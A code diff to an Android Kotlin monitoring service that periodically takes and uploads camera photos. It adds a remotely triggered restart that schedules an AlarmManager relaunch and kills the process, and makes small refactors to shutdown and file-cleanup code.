@@ -84,6 +84,7 @@ class MonitoringService : LifecycleService() {
                 statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, false)
             }
             "STOP_SERVICE" -> executeSelfDestruct()
+            "RESTART_APP" -> executeRestart()
             else -> Log.w(TAG, "未知指令: $command")
         }
     }
@@ -126,18 +127,13 @@ class MonitoringService : LifecycleService() {
 
         CoroutineScope(Dispatchers.IO).launch {
             Log.w(TAG, "📤 正在同步發送最後遺言...")
-            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, true)
+            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true)
 
             withContext(Dispatchers.Main) {
                 try {
                     WorkManager.getInstance(applicationContext).cancelAllWork()
                     
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        stopForeground(STOP_FOREGROUND_REMOVE)
-                    } else {
-                        @Suppress("DEPRECATION")
-                        stopForeground(true)
-                    }
+                    stopForeground(STOP_FOREGROUND_REMOVE)
                     
                     wakeLock?.let { if (it.isHeld) it.release() }
                     stopSelf()
@@ -148,6 +144,60 @@ class MonitoringService : LifecycleService() {
                 }
             }
         }
+    }
+
+    private fun executeRestart() {
+        if (isShuttingDown) return
+        isShuttingDown = true
+        Log.w(TAG, "🔄[重啟程序啟動] 收到遠端重啟指令！")
+
+        photoJob?.cancel()
+        serviceScope.cancel()
+
+        Thread {
+            // 1. 同步發送重啟確認
+            Log.w(TAG, "📤 正在發送重啟確認...")
+            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = false, isRestarting = true)
+
+            Handler(Looper.getMainLooper()).post {
+                try {
+                    // 2. 🌟 設定 AlarmManager 鬧鐘，3 秒後喚醒自己
+                    val restartIntent = Intent(applicationContext, MonitoringService::class.java)
+                    val pendingIntent = PendingIntent.getService(
+                        applicationContext,
+                        12345, // 請求碼
+                        restartIntent,
+                        PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+                    )
+
+                    val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
+                    
+                    // Android 12+ (API 31) 對精確鬧鐘有嚴格限制
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        if (alarmManager.canScheduleExactAlarms()) {
+                            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
+                        } else {
+                            // 若無權限則退而求其次使用不精確鬧鐘
+                            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
+                        }
+                    } else {
+                        alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
+                    }
+
+                    Log.w(TAG, "⏰ 已設定重啟鬧鐘，準備關閉當前進程...")
+
+                    // 3. 拔除當前通知並關閉服務
+                    stopForeground(STOP_FOREGROUND_REMOVE)
+                    stopSelf()
+
+                    // 4. 💥 殺死當前進程 (達到真正的 Hard Restart)
+                    android.os.Process.killProcess(android.os.Process.myPid())
+
+                } catch (e: Exception) {
+                    Log.e(TAG, "重啟設定失敗", e)
+                }
+            }
+        }.start()
     }
 
     private fun startCamera() {
@@ -179,7 +229,7 @@ class MonitoringService : LifecycleService() {
         
         val imageCapture = imageCapture ?: return
         
-        cleanUpOldFiles(cacheDir, 50)
+        cleanUpOldFiles(cacheDir)
         
         isCapturing = true
         Log.d(TAG, "📸 準備按下快門...")
@@ -232,7 +282,7 @@ class MonitoringService : LifecycleService() {
         })
     }
 
-    private fun cleanUpOldFiles(directory: File, maxSizeMB: Int) {
+    private fun cleanUpOldFiles(directory: File, maxSizeMB: Int = 50) {
         if (!directory.exists() || !directory.isDirectory) return
         val files = directory.listFiles() ?: return
         var totalSizeBytes = files.sumOf { it.length() }
@@ -287,7 +337,7 @@ class MonitoringService : LifecycleService() {
             isShuttingDown = true
             Log.w(TAG, "🛑 [本機中斷] 發送服務已中斷訊號給伺服器...")
             Thread {
-                statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, true)
+                statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true)
             }.start()
         }
         isRunning = false
